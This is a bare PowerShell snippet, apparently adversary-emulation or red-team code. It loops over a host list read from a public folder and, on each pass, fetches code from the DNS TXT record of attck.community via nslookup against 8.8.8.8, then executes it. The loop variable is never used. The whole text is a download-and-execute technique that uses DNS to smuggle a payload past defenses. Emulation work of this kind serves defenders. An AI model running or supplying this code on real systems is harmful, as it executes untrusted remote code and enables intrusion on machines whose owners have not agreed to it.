$rhosts = Get-Content -Path "C:\Users\Public\list.txt" 
foreach ($rhost in $rhosts)
{ 
   powershell .((nslookup -q=txt attck.community 8.8.8.8)[-1])
}